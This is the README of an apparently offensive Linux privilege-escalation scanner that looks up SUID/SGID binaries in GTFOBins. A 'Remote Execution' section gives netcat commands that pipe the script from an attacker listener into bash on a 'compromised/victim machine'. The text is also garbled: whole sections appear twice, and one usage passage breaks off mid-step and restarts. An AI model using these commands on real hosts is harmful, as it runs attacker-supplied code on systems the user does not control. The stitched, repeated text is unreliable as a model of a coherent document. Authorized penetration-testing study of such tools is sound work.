---

# 🔍 Omni - Privilege Escalation Scanner

A powerful Linux enumeration & privilege escalation scanner that detects exploitable SUID/SGID binaries, world-writable files, and more — all while supporting **offline GTFOBins lookup**.

---

## ✅ Features

* ✅ **Offline GTFOBins support** – Uses a local JSON file if no internet is available
* ✅ **SUID & SGID scanning** – Finds potentially exploitable binaries
* ✅ **Writable files/dirs** – Lists world-writable files and directories
* 🎯 **Lightweight, fast, and easy to run**

---

## 📁 Required Files

This tool requires the **GTFOBins JSON database** to check binaries against known privilege escalation vectors.

---

## 🔽 Download Required File

Before running the script, make sure to download the GTFOBins JSON file for offline use:

```bash
curl -s https://gtfobins.github.io/gtfobins.json -o gtfobins-offline.json
```

This creates the `gtfobins-offline.json` file needed for offline scanning.

---

## 🚀 Usage

Make the script executable:
---

# 🔍 Omni - Privilege Escalation Scanner

A powerful Linux enumeration & privilege escalation scanner that detects exploitable SUID/SGID binaries, world-writable files, and more — all while supporting **offline GTFOBins lookup**.

---

## ✅ Features

* ✅ **Offline GTFOBins support** – Uses a local JSON file if no internet is available
* ✅ **SUID & SGID scanning** – Finds potentially exploitable binaries
* ✅ **Writable files/dirs** – Lists world-writable files and directories
* 🎯 **Lightweight, fast, and easy to run**

---

## 📦 Requirements

* `jq` – for JSON parsing
* `findutils`, `bash`, `chmod`
* Optional: `curl` (for online GTFOBins updates)

Install dependencies:

```bash
sudo apt install jq findutils curl -y
```

---

## 📁 Required Files

This tool requires the **GTFOBins JSON database** to check binaries against known privilege escalation vectors.

---

## 🔽 Download Required File

Before running the script, make sure to download the GTFOBins JSON file for offline use:

```bash
curl -s https://gtfobins.github.io/gtfobins.json -o gtfobins-offline.json
```

This creates the `gtfobins-offline.json` file needed for offline scanning.

---

## 🚀 Usage

Make the script executable:

```bash
chmod +x Omni
```

Run it (preferably as root):

```bash
./Omni
```

Or with `sudo`:

```bash
sudo ./Omni
```

---

```bash
chmod +x Omni
```

Run it (preferably as root):

```bash
./Omni
```

Or with `sudo`:

```bash
sudo ./Omni
```

---

🧪 Remote Execution (Optional)
You can also pipe the script via netcat to remotely execute it on a compromised/victim machine.

📡 Example
On your attacker machine (listener):

```bash
nc -lvnp 4444 < Omni
```

On the victim machine (execution):

```bash
nc [attacker-ip] 4444 | bash
```

⚠️ Note: Ensure the required dependencies (bash, findutils) are installed on the victim machine.

---

🧠 Disclaimer
This tool is intended for educational purposes and authorized testing only. Unauthorized use is strictly prohibited.



